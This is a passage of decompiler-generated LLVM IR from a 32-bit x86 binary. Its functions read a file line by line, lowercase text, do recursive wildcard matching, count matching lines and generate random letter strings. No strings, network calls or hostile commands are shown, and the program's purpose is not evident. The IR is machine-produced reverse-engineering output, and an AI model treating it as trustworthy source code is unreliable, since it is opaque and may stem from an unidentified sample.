dec_label_pc_8048c5e:                             ; preds = %dec_label_pc_8048c28
  %v1_8048c5e = call i32 @function_804e1ec(i32 %v3_8048c47)
  %v1_8048c63 = inttoptr i32 %v1_8048c5e to i32*
  %v2_8048c63 = load i32, i32* %v1_8048c63, align 4
  %v9_8048c65 = icmp eq i32 %v2_8048c63, 4
  br i1 %v9_8048c65, label %dec_label_pc_8048c28, label %dec_label_pc_8048c6a

dec_label_pc_8048c6a:                             ; preds = %dec_label_pc_8048c5e, %dec_label_pc_8048c28
  %v13_8048c55.lcssa = phi i1 [ false, %dec_label_pc_8048c28 ], [ true, %dec_label_pc_8048c5e ]
  %v3_8048c78 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c78 = call i32 @function_804e0dc(i32 2, %_TYPEDEF_sigset_t* %v3_8048c78, i32 0)
  %v2_8048c86 = mul i32 %tmp8, 4
  %v0_8048c8b = load i8*, i8** @global_var_8059440.17, align 4
  %v1_8048c8b = ptrtoint i8* %v0_8048c8b to i32
  %v2_8048c90 = add i32 %v1_8048c8b, %v2_8048c86
  %v1_8048c93 = inttoptr i32 %v2_8048c90 to i32*
  store i32 0, i32* %v1_8048c93, align 4
  br i1 %v13_8048c55.lcssa, label %dec_label_pc_8048cca, label %dec_label_pc_8048ca2

dec_label_pc_8048ca2:                             ; preds = %dec_label_pc_8048c6a
  %v3_8048ca2 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cae = and i32 %v3_8048ca2, 65280
  %v2_8048cb51 = udiv i32 %v1_8048cae, 256
  br label %dec_label_pc_8048cca

dec_label_pc_8048cca:                             ; preds = %dec_label_pc_8048c6a, %dec_label_pc_8048ca2
  %storemerge2 = phi i32 [ %v2_8048cb51, %dec_label_pc_8048ca2 ], [ -1, %dec_label_pc_8048c6a ]
  br label %dec_label_pc_8048cd6

dec_label_pc_8048cd6:                             ; preds = %dec_label_pc_8048b7a, %dec_label_pc_8048b8c, %dec_label_pc_8048cca
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048cca ], [ -1, %dec_label_pc_8048b8c ], [ -1, %dec_label_pc_8048b7a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c47, { 1, 0 }
  uselistorder i32 %v2_8048b8f, { 1, 0 }
  uselistorder i8* %v0_8048b83, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_804f72c, { 2, 1, 0 }
  uselistorder i8** @global_var_8059440.17, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cd6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048cca, { 1, 0 }
}

define i32 @function_8048cde(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8048cde:
  br label %dec_label_pc_8048d17

dec_label_pc_8048cf4:                             ; preds = %dec_label_pc_8048d1f
  %v3_8048d03 = inttoptr i32 %v5_8048d22 to i32*
  %v4_8048d03 = call i32 @function_804e03c(i32 %arg3, i32* %v3_8048d03, i32 1)
  %v4_8048d0e = add nuw i32 %storemerge13, 1
  %v8_8048d11 = icmp eq i32 %v4_8048d03, 0
  %v12_8048d11 = icmp eq i32 %v4_8048d03, 1
  %v1_8048d15 = icmp eq i1 %v12_8048d11, false
  br i1 %v1_8048d15, label %dec_label_pc_8048d2c, label %dec_label_pc_8048d17

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048cde, %dec_label_pc_8048cf4
  %v8_8048d114 = phi i1 [ false, %dec_label_pc_8048cde ], [ %v8_8048d11, %dec_label_pc_8048cf4 ]
  %storemerge13 = phi i32 [ 0, %dec_label_pc_8048cde ], [ %v4_8048d0e, %dec_label_pc_8048cf4 ]
  %v5_8048d1d = icmp slt i32 %storemerge13, %arg2
  br i1 %v5_8048d1d, label %dec_label_pc_8048d1f, label %dec_label_pc_8048d2c

dec_label_pc_8048d1f:                             ; preds = %dec_label_pc_8048d17
  %v5_8048d22 = add i32 %storemerge13, %arg1
  %v1_8048d25 = add i32 %v5_8048d22, -1
  %v1_8048d26 = inttoptr i32 %v1_8048d25 to i8*
  %v2_8048d26 = load i8, i8* %v1_8048d26, align 1
  %v10_8048d28 = icmp eq i8 %v2_8048d26, 10
  %v1_8048d2a = icmp eq i1 %v10_8048d28, false
  br i1 %v1_8048d2a, label %dec_label_pc_8048cf4, label %dec_label_pc_8048d2c

dec_label_pc_8048d2c:                             ; preds = %dec_label_pc_8048d17, %dec_label_pc_8048d1f, %dec_label_pc_8048cf4
  %v8_8048d11.lcssa = phi i1 [ %v8_8048d114, %dec_label_pc_8048d17 ], [ %v8_8048d114, %dec_label_pc_8048d1f ], [ %v8_8048d11, %dec_label_pc_8048cf4 ]
  br i1 %v8_8048d11.lcssa, label %dec_label_pc_8048d41, label %dec_label_pc_8048d32

dec_label_pc_8048d32:                             ; preds = %dec_label_pc_8048d2c
  br label %dec_label_pc_8048d41

dec_label_pc_8048d41:                             ; preds = %dec_label_pc_8048d2c, %dec_label_pc_8048d32
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d32 ], [ 0, %dec_label_pc_8048d2c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d22, { 1, 0 }
  uselistorder i1 %v8_8048d114, { 1, 0 }
  uselistorder i1 %v8_8048d11, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d41, { 1, 0 }
  uselistorder label %dec_label_pc_8048d2c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d17, { 1, 0 }
}

define i32 @function_8048d46(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048d46:
  %v4_8048d761 = ptrtoint i8* %arg1 to i32
  %v2_8048d792 = load i8, i8* %arg1, align 1
  %v4_8048d7b6 = icmp eq i8 %v2_8048d792, 0
  br i1 %v4_8048d7b6, label %dec_label_pc_8048d85, label %dec_label_pc_8048d7f

dec_label_pc_8048d55:                             ; preds = %dec_label_pc_8048d7f
  %v2_8048d5a = mul i32 %stack_var_-8.08, 16
  %v2_8048d60 = load i8, i8* %stack_var_4.09, align 1
  %v3_8048d60 = zext i8 %v2_8048d60 to i32
  %v1_8048d67 = mul nuw nsw i32 %v3_8048d60, 4
  %v2_8048d67 = add i32 %v1_8048d67, ptrtoint (i32* @global_var_8052560.21 to i32)
  %v3_8048d67 = inttoptr i32 %v2_8048d67 to i32*
  %v4_8048d67 = load i32, i32* %v3_8048d67, align 4
  %v2_8048d6e = or i32 %v4_8048d67, %v2_8048d5a
  %v5_8048d73 = add i32 %v4_8048d7610, 1
  %v22_8048d73 = inttoptr i32 %v5_8048d73 to i8*
  %v2_8048d79 = load i8, i8* %v22_8048d73, align 1
  %v4_8048d7b = icmp eq i8 %v2_8048d79, 0
  br i1 %v4_8048d7b, label %dec_label_pc_8048d85, label %dec_label_pc_8048d7f

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048d46, %dec_label_pc_8048d55
  %v4_8048d7610 = phi i32 [ %v5_8048d73, %dec_label_pc_8048d55 ], [ %v4_8048d761, %dec_label_pc_8048d46 ]
  %stack_var_4.09 = phi i8* [ %v22_8048d73, %dec_label_pc_8048d55 ], [ %arg1, %dec_label_pc_8048d46 ]
  %stack_var_-8.08 = phi i32 [ %v2_8048d6e, %dec_label_pc_8048d55 ], [ 0, %dec_label_pc_8048d46 ]
  %v5_8048d7f = icmp slt i32 %stack_var_-8.08, 0
  %v1_8048d83 = icmp eq i1 %v5_8048d7f, false
  br i1 %v1_8048d83, label %dec_label_pc_8048d55, label %dec_label_pc_8048d85

dec_label_pc_8048d85:                             ; preds = %dec_label_pc_8048d55, %dec_label_pc_8048d7f, %dec_label_pc_8048d46
  %stack_var_-8.0.lcssa = phi i32 [ 0, %dec_label_pc_8048d46 ], [ %v2_8048d6e, %dec_label_pc_8048d55 ], [ %stack_var_-8.08, %dec_label_pc_8048d7f ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.08, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048d85, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d7f, { 1, 0 }
}

define i32 @function_8048d8a(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8048d8a:
  %tmp14 = inttoptr i32 %arg2 to i8*
  %v0_8048d8d = load i32, i32* @ebx, align 4
  %v4_8048d91 = ptrtoint i8* %arg1 to i32
  %v2_8048d94 = load i8, i8* %arg1, align 1
  switch i8 %v2_8048d94, label %dec_label_pc_8048e57 [
    i8 42, label %dec_label_pc_8048dcb
    i8 63, label %dec_label_pc_8048e1d
    i8 0, label %dec_label_pc_8048db7
  ]

dec_label_pc_8048db7:                             ; preds = %dec_label_pc_8048d8a
  %v2_8048dba = load i8, i8* %tmp14, align 1
  %v3_8048dba = zext i8 %v2_8048dba to i32
  br label %dec_label_pc_8048eb8

dec_label_pc_8048dcb:                             ; preds = %dec_label_pc_8048d8a
  %v1_8048dce = add i32 %v4_8048d91, 1
  %v5_8048dd5 = inttoptr i32 %v1_8048dce to i8*
  %v5_8048dd6 = call i32 @function_8048d8a(i8* %v5_8048dd5, i32 %arg2)
  %v1_8048dde = icmp eq i32 %v5_8048dd6, 0
  br i1 %v1_8048dde, label %dec_label_pc_8048e0b, label %dec_label_pc_8048de2

dec_label_pc_8048de2:                             ; preds = %dec_label_pc_8048dcb
  %v2_8048de5 = load i8, i8* %tmp14, align 1
  %v4_8048de7 = icmp eq i8 %v2_8048de5, 0
  br i1 %v4_8048de7, label %dec_label_pc_8048e12, label %dec_label_pc_8048deb

dec_label_pc_8048deb:                             ; preds = %dec_label_pc_8048de2
  %v1_8048dee = add i32 %arg2, 1
  %v5_8048df6 = call i32 @function_8048d8a(i8* nonnull %arg1, i32 %v1_8048dee)
  %v1_8048dfe = icmp eq i32 %v5_8048df6, 0
  br i1 %v1_8048dfe, label %dec_label_pc_8048e0b, label %dec_label_pc_8048e12

dec_label_pc_8048e0b:                             ; preds = %dec_label_pc_8048deb, %dec_label_pc_8048dcb
  br label %dec_label_pc_8048e12

dec_label_pc_8048e12:                             ; preds = %dec_label_pc_8048de2, %dec_label_pc_8048deb, %dec_label_pc_8048e0b
  %storemerge8 = phi i32 [ 0, %dec_label_pc_8048e0b ], [ 1, %dec_label_pc_8048deb ], [ 1, %dec_label_pc_8048de2 ]
  br label %dec_label_pc_8048eb8

dec_label_pc_8048e1d:                             ; preds = %dec_label_pc_8048d8a
  %v2_8048e20 = load i8, i8* %tmp14, align 1
  %v4_8048e22 = icmp eq i8 %v2_8048e20, 0
  br i1 %v4_8048e22, label %dec_label_pc_8048e4f, label %dec_label_pc_8048e26

dec_label_pc_8048e26:                             ; preds = %dec_label_pc_8048e1d
  %v1_8048e29 = add i32 %arg2, 1
  %v1_8048e2d = add i32 %v4_8048d91, 1
  %v5_8048e32 = inttoptr i32 %v1_8048e2d to i8*
  %v5_8048e33 = call i32 @function_8048d8a(i8* %v5_8048e32, i32 %v1_8048e29)
  %v1_8048e3b = icmp ne i32 %v5_8048e33, 0
  %. = zext i1 %v1_8048e3b to i32
  br label %dec_label_pc_8048e4f

dec_label_pc_8048e4f:                             ; preds = %dec_label_pc_8048e26, %dec_label_pc_8048e1d
  %storemerge5 = phi i32 [ 1, %dec_label_pc_8048e1d ], [ %., %dec_label_pc_8048e26 ]
  br label %dec_label_pc_8048eb8

dec_label_pc_8048e57:                             ; preds = %dec_label_pc_8048d8a
  %v2_8048e5a = load i8, i8* %arg1, align 1
  %v3_8048e5a = zext i8 %v2_8048e5a to i32
  %v2_8048e65 = call i32 @function_804e1cc(i32 %v3_8048e5a)
  store i32 %v2_8048e65, i32* @ebx, align 4
  %v2_8048e72 = load i8, i8* %tmp14, align 1
  %v3_8048e72 = zext i8 %v2_8048e72 to i32
  %v2_8048e7d = call i32 @function_804e1cc(i32 %v3_8048e72)
  %v0_8048e85 = load i32, i32* @ebx, align 4
  %v12_8048e85 = icmp eq i32 %v0_8048e85, %v2_8048e7d
  %v1_8048e87 = icmp eq i1 %v12_8048e85, false
  br i1 %v1_8048e87, label %dec_label_pc_8048eb2, label %dec_label_pc_8048e89

dec_label_pc_8048e89:                             ; preds = %dec_label_pc_8048e57
  %v1_8048e8c = add i32 %arg2, 1
  %v1_8048e90 = add i32 %v4_8048d91, 1
  %v5_8048e95 = inttoptr i32 %v1_8048e90 to i8*
  %v5_8048e96 = call i32 @function_8048d8a(i8* %v5_8048e95, i32 %v1_8048e8c)
  %v1_8048e9e = icmp ne i32 %v5_8048e96, 0
  %.9 = zext i1 %v1_8048e9e to i32
  br label %dec_label_pc_8048eb2

dec_label_pc_8048eb2:                             ; preds = %dec_label_pc_8048e89, %dec_label_pc_8048e57
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e57 ], [ %.9, %dec_label_pc_8048e89 ]
  br label %dec_label_pc_8048eb8

dec_label_pc_8048eb8:                             ; preds = %dec_label_pc_8048e4f, %dec_label_pc_8048e12, %dec_label_pc_8048db7, %dec_label_pc_8048eb2
  %stack_var_-24.0 = phi i32 [ %storemerge8, %dec_label_pc_8048e12 ], [ %storemerge5, %dec_label_pc_8048e4f ], [ %v3_8048dba, %dec_label_pc_8048db7 ], [ %storemerge, %dec_label_pc_8048eb2 ]
  store i32 %v0_8048d8d, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_8048d91, { 2, 1, 0 }
  uselistorder i8* %tmp14, { 3, 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8048eb8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e12, { 2, 1, 0 }
}

define i32 @function_8048ec0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_8048ec0:
  %v1_8048ecd = call i32 @function_804f55c(i32 %arg1)
  store i32 %v1_8048ecd, i32* %arg2, align 4
  %v10_8048ee1 = icmp eq i32 %v1_8048ecd, -1
  %. = zext i1 %v10_8048ee1 to i32
  ret i32 %.
}

define i32 @function_8048efb(i8* %arg1) local_unnamed_addr {
dec_label_pc_8048efb:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048efb = load i32, i32* @ebp, align 4
  store i32 %v0_8048efb, i32* %stack_var_-4, align 4
  %v4_8048f232 = ptrtoint i8* %arg1 to i32
  %v2_8048f263 = load i8, i8* %arg1, align 1
  %v3_8048f264 = zext i8 %v2_8048f263 to i32
  %v5_8048f265 = and i32 %v4_8048f232, -256
  %v6_8048f266 = or i32 %v3_8048f264, %v5_8048f265
  %v4_8048f287 = icmp eq i8 %v2_8048f263, 0
  %v1_8048f2a9 = icmp eq i1 %v4_8048f287, false
  br i1 %v1_8048f2a9, label %dec_label_pc_8048f03.lr.ph, label %dec_label_pc_8048f2c

dec_label_pc_8048f03.lr.ph:                       ; preds = %dec_label_pc_8048efb
  br label %dec_label_pc_8048f03

dec_label_pc_8048f03:                             ; preds = %dec_label_pc_8048f03, %dec_label_pc_8048f03.lr.ph
  %v4_8048f2311 = phi i32 [ %v4_8048f232, %dec_label_pc_8048f03.lr.ph ], [ %v5_8048f20, %dec_label_pc_8048f03 ]
  %stack_var_4.010 = phi i8* [ %arg1, %dec_label_pc_8048f03.lr.ph ], [ %v22_8048f20, %dec_label_pc_8048f03 ]
  %v2_8048f06 = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f06 = zext i8 %v2_8048f06 to i32
  %v1_8048f11 = call i32 @function_804e1cc(i32 %v3_8048f06)
  %v1_8048f1e = trunc i32 %v1_8048f11 to i8
  store i8 %v1_8048f1e, i8* %stack_var_4.010, align 1
  %v5_8048f20 = add i32 %v4_8048f2311, 1
  %v22_8048f20 = inttoptr i32 %v5_8048f20 to i8*
  %v2_8048f26 = load i8, i8* %v22_8048f20, align 1
  %v4_8048f28 = icmp eq i8 %v2_8048f26, 0
  %v1_8048f2a = icmp eq i1 %v4_8048f28, false
  br i1 %v1_8048f2a, label %dec_label_pc_8048f03, label %dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge

dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge: ; preds = %dec_label_pc_8048f03
  %v3_8048f26 = zext i8 %v2_8048f26 to i32
  %v5_8048f26 = and i32 %v5_8048f20, -256
  %v6_8048f26 = or i32 %v3_8048f26, %v5_8048f26
  %v2_8048f2c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048f2c

dec_label_pc_8048f2c:                             ; preds = %dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge, %dec_label_pc_8048efb
  %v2_8048f2c = phi i32 [ %v2_8048f2c.pre, %dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge ], [ %v0_8048efb, %dec_label_pc_8048efb ]
  %v6_8048f26.lcssa = phi i32 [ %v6_8048f26, %dec_label_pc_8048f23.dec_label_pc_8048f2c_crit_edge ], [ %v6_8048f266, %dec_label_pc_8048efb ]
  store i32 %v2_8048f2c, i32* @ebp, align 4
  ret i32 %v6_8048f26.lcssa

; uselistorder directives
  uselistorder i8 %v2_8048f26, { 1, 0 }
  uselistorder i8* %v22_8048f20, { 1, 0 }
  uselistorder i32 %v5_8048f20, { 1, 2, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder i32 (i32)* @function_804e1cc, { 2, 1, 0 }
}

define i32 @function_8048f2e(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048f2e:
  %stack_var_-4104 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %v5_8048f42 = call i32 @function_804dfa8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8052960.22, i32 0, i32 0), i32 0)
  %v2_80490a0 = ptrtoint i32* %stack_var_-4112 to i32
  %tmp33 = bitcast i32* %stack_var_-4112 to i8*
  %v5_80490b236 = call i32 @function_8048cde(i32 %v2_80490a0, i32 4096, i32 %v5_8048f42)
  %v1_80490ba37 = icmp eq i32 %v5_80490b236, 0
  %v1_80490bc38 = icmp eq i1 %v1_80490ba37, false
  br i1 %v1_80490bc38, label %dec_label_pc_8048f52, label %dec_label_pc_80490c2

dec_label_pc_8048f52:                             ; preds = %dec_label_pc_8048f2e, %dec_label_pc_8049084
  %v3_8048f5c = call i32 @function_8048efb(i8* %tmp33)
  %v5_8048f73 = call i32 @function_804f284(i32 %v2_80490a0, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805296e.23, i32 0, i32 0))
  %v12_8048f83 = icmp eq i32 %v5_8048f73, %v2_80490a0
  %v1_8048f85 = icmp eq i1 %v12_8048f83, false
  br i1 %v1_8048f85, label %dec_label_pc_8049084, label %dec_label_pc_8048f8b

dec_label_pc_8048f8b:                             ; preds = %dec_label_pc_8048f52
  %tmp34 = bitcast i32* %stack_var_-4104 to i8*
  br label %dec_label_pc_8048f9c

dec_label_pc_8048f99:                             ; preds = %dec_label_pc_8048fae, %dec_label_pc_8048fa5, %dec_label_pc_8048f9c
  %v5_8048f99 = add i32 %v4_8048f9c, 1
  %v22_8048f99 = inttoptr i32 %v5_8048f99 to i8*
  br label %dec_label_pc_8048f9c

dec_label_pc_8048f9c:                             ; preds = %dec_label_pc_8048f8b, %dec_label_pc_8048f99
  %storemerge4 = phi i8* [ %v22_8048f99, %dec_label_pc_8048f99 ], [ %tmp34, %dec_label_pc_8048f8b ]
  %v4_8048f9c = ptrtoint i8* %storemerge4 to i32
  %v2_8048f9f = load i8, i8* %storemerge4, align 1
  %v7_8048fa1 = icmp eq i8 %v2_8048f9f, 32
  br i1 %v7_8048fa1, label %dec_label_pc_8048f99, label %dec_label_pc_8048fa5

dec_label_pc_8048fa5:                             ; preds = %dec_label_pc_8048f9c
  %v2_8048fa8 = load i8, i8* %storemerge4, align 1
  %v10_8048faa = icmp eq i8 %v2_8048fa8, 9
  br i1 %v10_8048faa, label %dec_label_pc_8048f99, label %dec_label_pc_8048fae

dec_label_pc_8048fae:                             ; preds = %dec_label_pc_8048fa5
  %v2_8048fb1 = load i8, i8* %storemerge4, align 1
  %v10_8048fb3 = icmp eq i8 %v2_8048fb1, 58
  br i1 %v10_8048fb3, label %dec_label_pc_8048f99, label %dec_label_pc_8048fde

dec_label_pc_8048fb9:                             ; preds = %dec_label_pc_8049006, %dec_label_pc_8048fde
  %v3_8048fd0 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048fd7 = add i32 %v4_8048f9c, %v3_8048fd0
  %v1_8048fda = add i32 %v6_8048fd7, -1
  %v1_8048fdb = inttoptr i32 %v1_8048fda to i8*
  store i8 0, i8* %v1_8048fdb, align 1
  br label %dec_label_pc_8048fde

dec_label_pc_8048fde:                             ; preds = %dec_label_pc_8048fae, %dec_label_pc_8048fb9
  %v3_8048ff5 = call i32 @_strlen(i8* %storemerge4)
  %v6_8048ffc = add i32 %v4_8048f9c, %v3_8048ff5
  %v1_8048fff = add i32 %v6_8048ffc, -1
  %v1_8049000 = inttoptr i32 %v1_8048fff to i8*
  %v2_8049000 = load i8, i8* %v1_8049000, align 1
  %v10_8049002 = icmp eq i8 %v2_8049000, 13
  br i1 %v10_8049002, label %dec_label_pc_8048fb9, label %dec_label_pc_8049006

dec_label_pc_8049006:                             ; preds = %dec_label_pc_8048fde
  store i32 %v4_8048f9c, i32* @edi, align 4
  %v3_804901d = call i32 @_strlen(i8* %storemerge4)
  %v6_8049024 = add i32 %v4_8048f9c, %v3_804901d
  %v1_8049027 = add i32 %v6_8049024, -1
  %v1_8049028 = inttoptr i32 %v1_8049027 to i8*
  %v2_8049028 = load i8, i8* %v1_8049028, align 1
  %v10_804902a = icmp eq i8 %v2_8049028, 10
  br i1 %v10_804902a, label %dec_label_pc_8048fb9, label %dec_label_pc_804902e

dec_label_pc_804902e:                             ; preds = %dec_label_pc_8049006
  %v5_8049037 = call i32 @function_804f1f0(i8* %storemerge4, i32 46)
  %v1_804903f = icmp eq i32 %v5_8049037, 0
  br i1 %v1_804903f, label %dec_label_pc_8049057, label %dec_label_pc_8049043

dec_label_pc_8049043:                             ; preds = %dec_label_pc_804902e
  %v5_804904c = call i32 @function_804f1f0(i8* %storemerge4, i32 46)
  %v6_804904c = inttoptr i32 %v5_804904c to i8*
  store i8 0, i8* %v6_804904c, align 1
  br label %dec_label_pc_8049057

dec_label_pc_8049057:                             ; preds = %dec_label_pc_804902e, %dec_label_pc_8049043
  store i32 %v4_8048f9c, i32* @eax, align 4
  %v5_8049061 = inttoptr i32 %arg1 to i8*
  %v5_8049062 = call i32 @function_804f210(i8* %v5_8049061, i32 %v4_8048f9c)
  %v2_8049070 = call i32 @function_804de24(i32 %v5_8048f42)
  br label %dec_label_pc_80490da

dec_label_pc_8049084:                             ; preds = %dec_label_pc_8048f52
  %v6_8049098 = call i32 @function_804f1d8(i8* %tmp33, i32 0, i32 4096)
  %v5_80490b2 = call i32 @function_8048cde(i32 %v2_80490a0, i32 4096, i32 %v5_8048f42)
  %v1_80490ba = icmp eq i32 %v5_80490b2, 0
  %v1_80490bc = icmp eq i1 %v1_80490ba, false
  br i1 %v1_80490bc, label %dec_label_pc_8048f52, label %dec_label_pc_80490c2

dec_label_pc_80490c2:                             ; preds = %dec_label_pc_8049084, %dec_label_pc_8048f2e
  %v2_80490c8 = call i32 @function_804de24(i32 %v5_8048f42)
  br label %dec_label_pc_80490da

dec_label_pc_80490da:                             ; preds = %dec_label_pc_8049057, %dec_label_pc_80490c2
  %storemerge = phi i32 [ 1, %dec_label_pc_80490c2 ], [ 0, %dec_label_pc_8049057 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8048f9c, { 3, 4, 1, 5, 2, 0, 6 }
  uselistorder i8* %storemerge4, { 0, 1, 2, 4, 3, 5, 6, 8, 7 }
  uselistorder i32 %v2_80490a0, { 3, 1, 2, 0 }
  uselistorder i32 %v5_8048f42, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_80490da, { 1, 0 }
  uselistorder label %dec_label_pc_8049057, { 1, 0 }
  uselistorder label %dec_label_pc_8048fde, { 1, 0 }
  uselistorder label %dec_label_pc_8048f9c, { 1, 0 }
  uselistorder label %dec_label_pc_8048f52, { 1, 0 }
}

define i32 @function_80490e5() local_unnamed_addr {
dec_label_pc_80490e5:
  %stack_var_-4108 = alloca i32, align 4
  %v5_80490ff = call i32 @function_804dfa8(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8052960.22, i32 0, i32 0), i32 0)
  %v2_8049160 = ptrtoint i32* %stack_var_-4108 to i32
  %tmp15 = bitcast i32* %stack_var_-4108 to i8*
  %v5_804917216 = call i32 @function_8048cde(i32 %v2_8049160, i32 4096, i32 %v5_80490ff)
  %v1_804917a17 = icmp eq i32 %v5_804917216, 0
  %v1_804917c18 = icmp eq i1 %v1_804917a17, false
  br i1 %v1_804917c18, label %dec_label_pc_804910c, label %dec_label_pc_804917e

dec_label_pc_804910c:                             ; preds = %dec_label_pc_80490e5, %dec_label_pc_804910c
  %stack_var_-12.119 = phi i32 [ %stack_var_-12.1.v4_8049141, %dec_label_pc_804910c ], [ 0, %dec_label_pc_80490e5 ]
  %v3_8049116 = call i32 @function_8048efb(i8* %tmp15)
  %v5_804912d = call i32 @function_804f284(i32 %v2_8049160, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805296e.23, i32 0, i32 0))
  %v12_804913d = icmp eq i32 %v5_804912d, %v2_8049160
  %v4_8049141 = zext i1 %v12_804913d to i32
  %stack_var_-12.1.v4_8049141 = add i32 %v4_8049141, %stack_var_-12.119
  %v6_8049158 = call i32 @function_804f1d8(i8* %tmp15, i32 0, i32 4096)
  %v5_8049172 = call i32 @function_8048cde(i32 %v2_8049160, i32 4096, i32 %v5_80490ff)
  %v1_804917a = icmp eq i32 %v5_8049172, 0
  %v1_804917c = icmp eq i1 %v1_804917a, false
  br i1 %v1_804917c, label %dec_label_pc_804910c, label %dec_label_pc_804917e

dec_label_pc_804917e:                             ; preds = %dec_label_pc_804910c, %dec_label_pc_80490e5
  %stack_var_-12.1.lcssa = phi i32 [ 0, %dec_label_pc_80490e5 ], [ %stack_var_-12.1.v4_8049141, %dec_label_pc_804910c ]
  %v2_8049184 = call i32 @function_804de24(i32 %v5_80490ff)
  ret i32 %stack_var_-12.1.lcssa

; uselistorder directives
  uselistorder i32 %v2_8049160, { 3, 1, 2, 0 }
  uselistorder i32 %v5_80490ff, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_8048cde, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804910c, { 1, 0 }
}

define i32 @function_8049191(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8049191:
  %v5_80491ef17 = icmp sgt i32 %arg2, 0
  br i1 %v5_80491ef17, label %dec_label_pc_80491a9.lr.ph, label %dec_label_pc_80491f1

dec_label_pc_80491a9.lr.ph:                       ; preds = %dec_label_pc_8049191
  %v5_80491ae = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_80491a9

dec_label_pc_80491a9:                             ; preds = %dec_label_pc_80491a9, %dec_label_pc_80491a9.lr.ph
  %storemerge18 = phi i32 [ 0, %dec_label_pc_80491a9.lr.ph ], [ %v4_80491e6, %dec_label_pc_80491a9 ]
  %v6_80491ae = add i32 %storemerge18, %v5_80491ae
  store i32 %v6_80491ae, i32* @ebx, align 4
  %v1_80491b1 = call i32 @function_8048298(i32 %storemerge18)
  %v2_80491c1 = udiv i32 %v1_80491b1, 26
  %tmp = mul i32 %v2_80491c1, -10
  %v2_80491d9 = add i32 %v1_80491b1, %tmp
  %v1_80491e1 = add i32 %v2_80491d9, 65
  %v11_80491e1 = trunc i32 %v1_80491e1 to i8
  %v2_80491e4 = load i32, i32* @ebx, align 4
  %v3_80491e4 = inttoptr i32 %v2_80491e4 to i8*
  store i8 %v11_80491e1, i8* %v3_80491e4, align 1
  %v4_80491e6 = add nuw nsw i32 %storemerge18, 1
  %exitcond = icmp eq i32 %v4_80491e6, %arg2
  br i1 %exitcond, label %dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge, label %dec_label_pc_80491a9

dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge: ; preds = %dec_label_pc_80491a9
  br label %dec_label_pc_80491f1

dec_label_pc_80491f1:                             ; preds = %dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge, %dec_label_pc_8049191
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_80491e9.dec_label_pc_80491f1_crit_edge ], [ 0, %dec_label_pc_8049191 ]
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %storemerge18, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @function_80491f8(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80491f8:
  %eax.global-to-local = alloca i32, align 4
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %v4_8049205 = ptrtoint i8* %arg2 to i32
  %v1_804920d = and i32 %v4_8049205, -256
  store i32 %v1_804920d, i32* %eax.global-to-local, align 4
  %v5_804920f = call i8* @_memset(i8* %arg2, i32 %v1_804920d, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804922f = ptrtoint i32* %stack_var_-168 to i32
  %tmp44 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804922f, i32* @edi, align 4
